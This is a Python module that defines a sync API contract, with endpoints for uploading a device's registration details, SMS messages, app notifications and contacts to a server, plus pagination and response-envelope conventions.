from typing import Dict, Any


SYNC_CONTRACT: Dict[str, Any] = {
    "version": "1.0",
    "envelope": {
        "success": "boolean",
        "data": "object|array|null",
        "meta": "object",
        "message": "string (optional)",
        "error": "string (on failure)",
    },
    "pagination": {
        "strategy": "skip_limit",
        "params": {
            "skip": "integer (offset, default 0)",
            "limit": "integer (page size, default 100, max 500)",
        },
        "meta": {
            "count": "integer",
            "next": "string|null",
            "previous": "string|null",
        },
    },
    "endpoints": {
        "device_register": {
            "path": "/api/devices/",
            "method": "POST",
            "body": {
                "device_id": "string",
                "name": "string",
                "model": "string",
                "phone": "string",
                "code": "string",
                "is_active": "boolean",
                "last_seen": "number (ms)",
                "battery_percentage": "integer",
                "system_info": "object",
            },
        },
        "messages_sync": {
            "path": "/api/messages/",
            "method": "POST",
            "body": [
                {
                    "device_id": "string",
                    "message_type": "received|sent",
                    "phone": "string",
                    "body": "string",
                    "timestamp": "number (ms)",
                    "read": "boolean",
                }
            ],
        },
        "notifications_sync": {
            "path": "/api/notifications/",
            "method": "POST",
            "body": [
                {
                    "device_id": "string",
                    "package_name": "string",
                    "title": "string",
                    "text": "string",
                    "timestamp": "number (ms)",
                }
            ],
        },
        "contacts_sync": {
            "path": "/api/contacts/",
            "method": "POST",
            "body": [
                {
                    "device_id": "string",
                    "phone_number": "string",
                    "name": "string",
                    "display_name": "string",
                    "phones": "array",
                    "emails": "array",
                }
            ],
        },
        "sync_status": {
            "path": "/api/sync/status/",
            "method": "GET|POST",
        },
    },
}
